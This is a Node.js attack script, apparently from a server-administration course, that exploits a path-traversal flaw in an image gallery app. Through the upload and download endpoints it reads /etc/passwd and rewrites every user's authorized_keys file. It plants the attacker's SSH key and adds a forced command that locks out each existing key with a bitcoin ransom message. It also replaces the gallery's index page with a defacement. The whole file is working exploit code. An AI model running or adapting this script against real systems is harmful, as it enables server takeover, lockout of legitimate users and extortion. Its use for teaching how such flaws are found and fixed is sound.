#!/usr/bin/env node
import chalk from 'chalk';
import { promises as fs } from 'fs';
import { compact, template } from 'lodash-es';
import fetch from 'node-fetch';
import { File, FormData } from 'formdata-node';

// Message that will be shown after the hack.
const hackMessage =
  'You have been h4ck3d (ㆆ _ ㆆ) Send all your bitcoins to show-me-the-money@archidep.ch if you want your server back.';

// Template that will be used for the hacked index page of the gallery.
const hackedIndexPageTemplate = template(`
doctype html
html
  head
    title
      | <%- title %>
  body
    h1
      | <%- text %>
`);

// Validate the number of command-line arguments.
if (process.argv.length < 4) {
  console.error(
    chalk.yellow(
      'The URL of the image gallery and the path to a public SSH key file must be provided as the first two arguments'
    )
  );

  process.exit(1);
}

// Extract command-line arguments.
const [url, publicKeyFile] = process.argv.slice(2);

// Run the hack function and print any error.
Promise.resolve()
  .then(hack)
  .catch(err => {
    console.error(chalk.red(err.stack));
    process.exit(42);
  });

/**
 * Hacks the server where the gallery is running.
 */
async function hack() {
  if (!/\.pub$/u.exec(publicKeyFile)) {
    throw new Error(
      `Public key file '${publicKeyFile}' does not end with '.pub'`
    );
  }

  const publicKey = await fs.readFile(publicKeyFile, 'utf8');

  const fileSystemRoot = await findRelativePathOfFileSystemRoot();
  for (const homeDir of await findHomeDirs(fileSystemRoot)) {
    await hackAuthorizedKeys(`${fileSystemRoot}${homeDir}`, publicKey);
  }

  await hackGalleryIndexPage();

  console.warn();
}

/**
 * Modifies authorized_keys files for all users on the server where the gallery
 * is running, disabling login and printing a message to inform them of the
 * hack.
 */
async function hackAuthorizedKeys(homeDir, publicKey) {
  console.warn();

  const authorizedKeysFile = `${homeDir}/.ssh/authorized_keys`;

  let authorizedKeysContents;
  try {
    authorizedKeysContents = await readFileFromImageGallery(authorizedKeysFile);
  } catch (err) {
    console.warn(`No authorized_keys file in ${homeDir}`);
    return;
  }

  const hackerKey = parseAuthorizedKey(publicKey);

  const authorizedKeys = authorizedKeysContents
    .split('\n')
    .filter(line => line.trim().length !== 0)
    .map(parseAuthorizedKey)
    .filter(
      // Ignore the hacker's key if it's already there.
      key => key.algorithm !== hackerKey.algorithm || key.key !== hackerKey.key
    );

  console.warn(
    `Found ${authorizedKeys.length} key(s) in ${chalk.yellow(
      authorizedKeysFile
    )}`
  );

  const hackedAuthorizedKeys = [
    hackerKey,
    ...authorizedKeys.map(hackAuthorizedKey)
  ];

  await writeFileWithImageGallery(
    authorizedKeysFile,
    `${hackedAuthorizedKeys.map(formatAuthorizedKey).join('\n')}\n`
  );

  console.warn(chalk.magenta(`Authorized keys (ㆆ _ ㆆ)`));
}

/**
 * Replaces the index page of the gallery with a hacked page.
 */
async function hackGalleryIndexPage() {
  await writeFileWithImageGallery(
    '/../views/index.pug',
    hackedIndexPageTemplate({
      title: '(ㆆ _ ㆆ)',
      text: hackMessage
    })
  );

  console.warn();
  console.warn(chalk.magenta(`Index page (ㆆ _ ㆆ)`));
}

/**
 * Finds all user home directores on the server where the image gallery is
 * running by reading the "/etc/passwd" file. This function looks for the home
 * directory of the root user and any other home directory under "/home".
 */
async function findHomeDirs(fileSystemRoot) {
  const etcPasswd = await readFileFromImageGallery(
    `${fileSystemRoot}/etc/passwd`
  );

  return etcPasswd
    .split('\n')
    .filter(line => line.trim().length !== 0)
    .map(line => {
      const [username, password, uid, gid, comment, homeDir, shell] =
        line.split(':');

      return {
        username,
        password,
        uid: parseInt(uid, 10),
        gid: parseInt(gid, 10),
        comment,
        homeDir,
        shell
      };
    })
    .filter(user => user.uid === 0 || user.homeDir.startsWith('/home/'))
    .map(user => user.homeDir);
}

/**
 * Finds the root of the file system of the server where the image gallery is
 * installed by repeatedly moving up the hierarchy (prepending "/..") until the
 * "/etc/passwd" file can be found.
 */
async function findRelativePathOfFileSystemRoot() {
  const attempts = 10;
  for (let i = 0; i < attempts; i++) {
    try {
      // Keep moving up the file system hierarchy.
      const relativePath = '/..'.repeat(i);

      // Attempt to read the /etc/passwd file from that relative path.
      await readFileFromImageGallery(`${relativePath}/etc/passwd`);

      // If there is no error, we've found the root of the file system.
      return relativePath;
    } catch (err) {
      // If the file is not found, we have not moved up enough yet. Continue
      // looping until we've exhausted the maximum number of attempts.
    }
  }

  throw new Error(
    `Could not find Unix file system root after ${attempts} attempts`
  );
}

/**
 * Reads a file on the server where the image gallery is running.
 *
 * This is possible because the image gallery simply concatenates the image name
 * with the path of the gallery's images directory. "../" can be prepended to
 * the image name as many times as necessary to move up the file system
 * hierarchy and read any file on the server, especially if the application is
 * run with the root user.
 */
async function readFileFromImageGallery(filename) {
  const res = await fetch(`${url}/images/${encodeURIComponent(filename)}`);
  if (res.status !== 200) {
    throw new Error(
      `Server responded with unexpected status code ${res.status}`
    );
  }

  return res.text();
}

/**
 * Writes a file on the server where the image gallery is running.
 *
 * This is possible because the image gallery simply concatenates the image name
 * with the path of the gallery's images directory. "../" can be prepended to
 * the image name as many times as necessary to move up the file system
 * hierarchy and write any file on the server, especially if the application is
 * run with the root user.
 */
async function writeFileWithImageGallery(filename, contents) {
  const body = new FormData();
  body.set('name', filename);
  body.set('image', new File([contents], filename));

  await fetch(`${url}/images`, { body, method: 'POST' });
}

/**
 * Parses one line in an SSH authorized_keys file, extracting the algorithm,
 * key, comment and options.
 */
function parseAuthorizedKey(line) {
  const parts = line.split(/\s+/u);
  const algorithmIndex = parts.indexOf(
    parts.find(part => part.startsWith('ssh-'))
  );
  if (algorithmIndex < 0) {
    throw new Error(
      `Could not find SSH algorithm in authorized_keys line: ${line}`
    );
  } else if (parts.length < algorithmIndex + 1) {
    throw new Error(`Could not parse parts of authorized_keys line: ${line}`);
  }

  let options =
    algorithmIndex >= 1 ? parts.slice(0, algorithmIndex).join(' ') : undefined;

  return {
    algorithm: parts[algorithmIndex],
    key: parts[algorithmIndex + 1],
    comment: parts[algorithmIndex + 2],
    options
  };
}

/**
 * Formats an authorized SSH key (algorithm, key, comment & options) into a line
 * suitable for an authorized_keys file.
 */
function formatAuthorizedKey({ algorithm, key, comment, options }) {
  return compact([options, algorithm, key, comment]).join(' ');
}

/**
 * Hacks an authorized SSH key so that the connection will be closed after
 * informing the user of the hack.
 */
function hackAuthorizedKey({ algorithm, key, comment }) {
  return {
    algorithm,
    key,
    comment: compact([
      comment ? comment.replace(' (ㆆ _ ㆆ)', '') : undefined,
      '(ㆆ _ ㆆ)'
    ]).join(' '),
    options: `no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo;echo '${hackMessage}';echo;exit 42"`
  };
}
